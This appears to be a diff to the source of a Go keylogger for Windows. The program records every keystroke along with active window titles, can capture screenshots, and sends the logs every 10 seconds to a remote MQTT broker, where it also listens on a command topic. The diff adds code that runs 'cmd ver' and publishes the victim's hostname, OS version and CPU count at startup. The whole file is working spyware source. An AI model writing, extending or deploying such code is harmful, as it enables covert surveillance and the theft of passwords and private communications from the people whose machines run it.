@@ -13,7 +13,10 @@ import (
 	"image"
 	"image/png"
 	"io/ioutil"
-	"MqttClient/info"
+	"os/exec"
+	"strings"
+	"bytes"
+	"runtime"
 )
 
 var (
@@ -25,8 +28,8 @@ var (
 	tmpKeylog string
 	tmpTitle  string
 
-	vClient mqtt.Client
-	channel string
+	vClient     mqtt.Client
+	channel     string
 	keyBrackets string
 )
 
@@ -34,6 +37,16 @@ var vh mqtt.MessageHandler = func(client mqtt.Client, msg mqtt.Message) {
 	fmt.Println("[ ", time.Now(), "]", " Message received: ")
 	fmt.Printf("TOPIC: %s\n", msg.Topic())
 	fmt.Printf("MSG: %s\n", msg.Payload())
+}
+
+type GoInfoObject struct {
+	GoOS     string
+	Kernel   string
+	Core     string
+	Platform string
+	OS       string
+	Hostname string
+	CPUs     int
 }
 
 //Get Active Window Title
@@ -87,87 +100,87 @@ func keyLogger() {
 			if int(Val) != 0 {
 				switch KEY {
 				case w32.VK_CONTROL:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Ctrl")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Ctrl")
 				case w32.VK_BACK:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Back")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Back")
 				case w32.VK_TAB:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Tab")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Tab")
 				case w32.VK_RETURN:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Enter")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Enter")
 				case w32.VK_SHIFT:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Shift")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Shift")
 				case w32.VK_MENU:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Alt")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Alt")
 				case w32.VK_CAPITAL:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"CapsLock")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "CapsLock")
 				case w32.VK_ESCAPE:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Esc")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Esc")
 				case w32.VK_SPACE:
 					tmpKeylog += " "
 				case w32.VK_PRIOR:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"PageUp")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "PageUp")
 				case w32.VK_NEXT:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"PageDown")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "PageDown")
 				case w32.VK_END:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"End")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "End")
 				case w32.VK_HOME:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Home")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Home")
 				case w32.VK_LEFT:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Left")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Left")
 				case w32.VK_UP:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Up")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Up")
 				case w32.VK_RIGHT:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Right")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Right")
 				case w32.VK_DOWN:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Down")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Down")
 				case w32.VK_SELECT:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Select")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Select")
 				case w32.VK_PRINT:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Print")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Print")
 				case w32.VK_EXECUTE:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Execute")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Execute")
 				case w32.VK_SNAPSHOT:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"PrintScreen")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "PrintScreen")
 				case w32.VK_INSERT:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Insert")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Insert")
 				case w32.VK_DELETE:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Delete")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Delete")
 				case w32.VK_HELP:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Help")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Help")
 				case w32.VK_LWIN:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"LeftWindows")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "LeftWindows")
 				case w32.VK_RWIN:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"RightWindows")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "RightWindows")
 				case w32.VK_APPS:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Applications")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Applications")
 				case w32.VK_SLEEP:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Sleep")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Sleep")
 				case w32.VK_NUMPAD0:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Pad 0")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 0")
 				case w32.VK_NUMPAD1:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Pad 1")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 1")
 				case w32.VK_NUMPAD2:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Pad 2")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 2")
 				case w32.VK_NUMPAD3:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Pad 3")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 3")
 				case w32.VK_NUMPAD4:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Pad 4")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 4")
 				case w32.VK_NUMPAD5:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Pad 5")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 5")
 				case w32.VK_NUMPAD6:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Pad 6")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 6")
 				case w32.VK_NUMPAD7:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Pad 7")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 7")
 				case w32.VK_NUMPAD8:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Pad 8")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 8")
 				case w32.VK_NUMPAD9:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Pad 9")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Pad 9")
 				case w32.VK_MULTIPLY:
 					tmpKeylog += "*"
 				case w32.VK_ADD:
 					tmpKeylog += "+"
 				case w32.VK_SEPARATOR:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"Separator")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "Separator")
 				case w32.VK_SUBTRACT:
 					tmpKeylog += "-"
 				case w32.VK_DECIMAL:
@@ -175,45 +188,45 @@ func keyLogger() {
 				case w32.VK_DIVIDE:
 					tmpKeylog += "Devide"
 				case w32.VK_F1:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"F1")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "F1")
 				case w32.VK_F2:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"F2")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "F2")
 				case w32.VK_F3:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"F3")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "F3")
 				case w32.VK_F4:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"F4")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "F4")
 				case w32.VK_F5:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"F5")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "F5")
 				case w32.VK_F6:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"F6")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "F6")
 				case w32.VK_F7:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"F7")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "F7")
 				case w32.VK_F8:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"F8")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "F8")
 				case w32.VK_F9:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"F9")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "F9")
 				case w32.VK_F10:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"F10")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "F10")
 				case w32.VK_F11:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"F11")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "F11")
 				case w32.VK_F12:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"F12")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "F12")
 				case w32.VK_NUMLOCK:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"NumLock")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "NumLock")
 				case w32.VK_SCROLL:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"ScrollLock")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "ScrollLock")
 				case w32.VK_LSHIFT:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"LeftShift")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "LeftShift")
 				case w32.VK_RSHIFT:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"RightShift")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "RightShift")
 				case w32.VK_LCONTROL:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"LeftCtrl")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "LeftCtrl")
 				case w32.VK_RCONTROL:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"RightCtrl")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "RightCtrl")
 				case w32.VK_LMENU:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"LeftMenu")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "LeftMenu")
 				case w32.VK_RMENU:
-					tmpKeylog += fmt.Sprintf(keyBrackets,"RightMenu")
+					tmpKeylog += fmt.Sprintf(keyBrackets, "RightMenu")
 				case w32.VK_OEM_1:
 					tmpKeylog += ";"
 				case w32.VK_OEM_2:
@@ -308,7 +321,7 @@ func keyLogger() {
 	}
 }
 
-func create(){
+func create() {
 	mqtt.ERROR = log.New(os.Stdout, "", 0)
 
 	hostame, _ := os.Hostname()
@@ -317,7 +330,7 @@ func create(){
 	opts.SetKeepAlive(2 * time.Second)
 	opts.SetDefaultPublishHandler(vh)
 	opts.SetPingTimeout(1 * time.Second)
-	opts.SetWill(channel,"Host: " + hostame + " disconnected",2,false)
+	opts.SetWill(channel, "Host: "+hostame+" disconnected", 2, false)
 	opts.AutoReconnect = true
 	vClient = mqtt.NewClient(opts)
 
@@ -327,17 +340,17 @@ func create(){
 	subscribeChannel(channel + "/cmd")
 }
 
-func sendMsg(topic string, payload string, qos byte, retained bool) mqtt.Token{
+func sendMsg(topic string, payload string, qos byte, retained bool) mqtt.Token {
 	token := vClient.Publish(topic, qos, retained, payload)
 	token.Wait()
 	return token
 }
 
-func sendLog(){
+func sendLog() {
 	create()
-	for vClient.IsConnected(){
+	for vClient.IsConnected() {
 		time.Sleep(10 * time.Second)
-		if tmpKeylog == ""{
+		if tmpKeylog == "" {
 			fmt.Print("\nNothing to show")
 			continue
 		}
@@ -351,7 +364,7 @@ func sendLog(){
 	}
 }
 
-func captureScreen(){
+func captureScreen() {
 	for {
 		img, err := screenshot.CaptureRect(image.Rect(0, 0, 1920, 1080))
 		if err != nil {
@@ -374,15 +387,15 @@ func captureScreen(){
 	}
 }
 
-func subscribeChannel(topic string) mqtt.Token{
+func subscribeChannel(topic string) mqtt.Token {
 	token := vClient.Subscribe(topic, 0, nil)
 	token.Wait()
 	return token
 
 }
 
-func pcInfo(){
-	GetInfo()
+func sendOnStart(){
+	sendMsg(channel, GetInfo().getPcInfo(), 2, true)
 }
 
 func main() {
@@ -391,6 +404,7 @@ func main() {
 	go keyLogger()
 	go windowLogger()
 	go sendLog()
+	sendOnStart()
 	//go captureScreen()
 
 	fmt.Println("Press Enter to Exit.")
@@ -402,4 +416,44 @@ func main() {
 			go sendLog()
 		}
 	}
+}
+
+func GetInfo() *GoInfoObject {
+	cmd := exec.Command("cmd", "ver")
+	cmd.Stdin = strings.NewReader("some input")
+	var out bytes.Buffer
+	var stderr bytes.Buffer
+	cmd.Stdout = &out
+	cmd.Stderr = &stderr
+	err := cmd.Run()
+	if err != nil {
+		panic(err)
+	}
+	osStr := strings.Replace(out.String(), "\n", "", -1)
+	osStr = strings.Replace(osStr, "\r\n", "", -1)
+	tmp1 := strings.Index(osStr, "[Version")
+	tmp2 := strings.Index(osStr, "]")
+	var ver string
+	if tmp1 == -1 || tmp2 == -1 {
+		ver = "unknown"
+	} else {
+		ver = osStr[tmp1+9:tmp2]
+	}
+	gio := &GoInfoObject{Kernel: "windows", Core: ver, Platform: "unknown", OS: "windows", GoOS: runtime.GOOS, CPUs: runtime.NumCPU()}
+	gio.Hostname, _ = os.Hostname()
+	return gio
+}
+
+func (gi *GoInfoObject) VarDump() {
+	fmt.Println("GoOS:", gi.GoOS)
+	fmt.Println("Kernel:", gi.Kernel)
+	fmt.Println("Core:", gi.Core)
+	fmt.Println("Platform:", gi.Platform)
+	fmt.Println("OS:", gi.OS)
+	fmt.Println("Hostname:", gi.Hostname)
+	fmt.Println("CPUs:", gi.CPUs)
+}
+
+func (gi *GoInfoObject) getPcInfo() string {
+	return fmt.Sprintf("GoOS:%v\nKernel:%v\nCore:%v\nPlatform:%v\nOS:%v\nHostname:%v\nCPUs:%v", gi.GoOS, gi.Kernel, gi.Core, gi.Platform, gi.OS, gi.Hostname, gi.CPUs)
 }
